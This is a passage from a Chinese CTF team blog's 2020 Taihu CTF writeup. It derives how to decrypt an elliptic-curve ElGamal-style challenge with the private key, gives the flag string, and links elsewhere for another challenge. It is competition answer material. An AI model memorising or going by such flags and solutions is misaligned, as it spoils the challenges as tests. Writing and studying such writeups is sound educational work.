<p>这里可以看到公钥参与到了明文的加密中，所以解密肯定时要用到密钥的。但是这里的k是一个随机数，这个随机数并没有公开，要怎么办呢？注意到之前加密中没有参与的y0，可以想到解密的关键就是<strong>利用y0</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">首先我们知道:</span><br><span class="line">(Kpoint.x, Kpoint.y)&#x3D;(Pubkey.x*k, Pubkey.y*k)</span><br><span class="line">而</span><br><span class="line">y0 &#x3D; (k*Genrator.x, k*Genrator.y)</span><br><span class="line">由于此时我们知道密钥PrivKey，则此时有</span><br><span class="line">(Pubkey.x, Pubkey.y) &#x3D; (Generator.x*Privkey, Generator.y*Privkey)</span><br><span class="line">所以可以得到</span><br><span class="line">(Kpoint.x, Kpoint.y)&#x3D;(Pubkey.x*k, Pubkey.y*k)    </span><br><span class="line">					&#x3D;(Generator.x*Privkey*k, Generator.y*Privkey*k)</span><br><span class="line">					&#x3D;(Generator.x*k, Generator.y*k)*PrivKey</span><br><span class="line">					&#x3D;y0*PrivKey</span><br></pre></td></tr></table></figure>
<p>由上述式子可以得到关键点<code>Kpoint</code>，于是就可以避免知道k。那么最后明文的求法就是:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X[0] &#x3D; Y[0]*Kpoint.x^(-1) mod _p</span><br><span class="line">X[1] &#x3D; Y[1]*Kpoint.y^(-1) mod _p</span><br></pre></td></tr></table></figure>
<p>这里<code>Kpoint.x^(-1)|Kpoint.y^(-1)</code>表示对应的数值在mod_p下的逆元。</p>
<p>flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3CC_I3_Use7f1_HaHA&#125;</span><br></pre></td></tr></table></figure>

<h3 id="aegis"><a href="#aegis" class="headerlink" title="aegis"></a>aegis</h3><p>这一题的详细解释放在了<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/222629">这里</a>，欢迎师傅们去踩（</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>出题总的来说队里的师傅们也是尽力了，主要是没想到小比赛来了太多的大师傅，超出了大伙的预料，题目难度把控可能有点问题。不过也是辛苦队伍里面的师傅们了，希望Asuri还能有下一次举办外部比赛的机会~</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://asuri.org/2020/11/24/2020-Taihuctf-writeup/" data-id="clg6iymqe003yguot05142be1" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2019/07/30/2019-googlectf-writeup-part2/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">2019-googlectf-writeup-part2</div>
    </a>
  
</nav>

  
</article>

</section>
        
        <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/">Develop</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Devops/">Devops</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/">Pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web-%E5%AE%89%E5%85%A8/">Web 安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Writeup/">Writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/">安卓安全</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2015-3864/" rel="tag">CVE-2015-3864</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rev/" rel="tag">Rev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/analytics/" rel="tag">analytics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/googlectf/" rel="tag">googlectf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jctf/" rel="tag">jctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mirai/" rel="tag">mirai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nuaactf/" rel="tag">nuaactf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phantom/" rel="tag">phantom</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qzone/" rel="tag">qzone</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/suctf/" rel="tag">suctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virus/" rel="tag">virus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" rel="tag">文件格式漏洞</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/CVE-2015-3864/" style="font-size: 10px;">CVE-2015-3864</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Pwn/" style="font-size: 15px;">Pwn</a> <a href="/tags/RCE/" style="font-size: 15px;">RCE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rev/" style="font-size: 10px;">Rev</a> <a href="/tags/Tools/" style="font-size: 15px;">Tools</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/analytics/" style="font-size: 10px;">analytics</a> <a href="/tags/googlectf/" style="font-size: 15px;">googlectf</a> <a href="/tags/jctf/" style="font-size: 10px;">jctf</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/mirai/" style="font-size: 10px;">mirai</a> <a href="/tags/nuaactf/" style="font-size: 15px;">nuaactf</a> <a href="/tags/phantom/" style="font-size: 10px;">phantom</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/qzone/" style="font-size: 10px;">qzone</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/suctf/" style="font-size: 10px;">suctf</a> <a href="/tags/virus/" style="font-size: 10px;">virus</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/xss/" style="font-size: 15px;">xss</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">文件格式漏洞</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/11/24/2020-Taihuctf-writeup/">2020-Taihuctf-writeup</a>
          </li>
        
          <li>
            <a href="/2019/07/30/2019-googlectf-writeup-part2/">2019-googlectf-writeup-part2</a>
          </li>
        
          <li>
            <a href="/2019/07/30/2019-googlectf-writeup-part1/">2019-googlectf-writeup-part1</a>
          </li>
        
          <li>
            <a href="/2019/04/22/Asuri_2019/">2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp</a>
          </li>
        
          <li>
            <a href="/2019/04/10/PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F/">从一道题讲PHP复杂变量</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2023 All Members<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
      <a href="https://beian.miit.gov.cn/" target="_blank">鲁ICP备15035817号-2</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/members" class="mobile-nav-link">Members</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>


    
  </div>

</body>

</html>